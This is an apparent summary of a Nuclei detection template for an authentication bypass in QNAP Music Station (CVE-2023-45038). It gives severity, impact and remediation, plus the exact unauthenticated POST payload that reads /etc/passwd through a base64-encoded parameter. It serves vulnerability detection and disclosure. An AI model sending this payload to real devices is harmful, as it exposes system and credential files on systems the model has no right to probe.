---
cve_id: CVE-2023-45038
template_path: nuclei-templates/http/cves/2023/CVE-2023-45038.yaml
affected_product: QNAP Music Station
severity: medium
authentication: none
external_callback: false
affected_versions: < 5.4.0
preconditions: []
poc_classification: auth-bypass
---

## Vulnerability
QNAP Music Station < 5.4.0 contains an improper authentication flaw (CVE-2023-45038, CWE-287) in `/musicstation/api/as_get_file_api.php`.  
Unauthenticated remote attackers can bypass all access controls on the file-retrieval endpoint.  
**CVSS 3.1:** 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N).  
**Impact:** Arbitrary file reads on the underlying QNAP system (e.g. `/etc/passwd`, credential files, configuration).  
**Remediation:** Upgrade to Music Station 5.4.0 or newer (proper authentication added to the endpoint).

## PoC / Detection
Classification: auth-bypass  

The template issues one unauthenticated raw POST:  
`POST /musicstation/api/as_get_file_api.php`  
`ssid=dummy&songid=1&tt=ts&f=L2V0Yy9wYXNzd2Q=` (base64-encoded `/etc/passwd`).  

Matchers confirm success when:  
- status = 200  
- `Content-Disposition` contains `filename='passwd'`  
- response body matches `admin:.*:0:0:` (signature line from `/etc/passwd`).  

This directly exercises the authentication bypass and returns protected system files.

## References
- https://www.qnap.com/en/security-advisory/qsa-24-25
- https://karzemrok.com/qnap-qsa-24-25
- https://nvd.nist.gov/vuln/detail/CVE-2023-45038
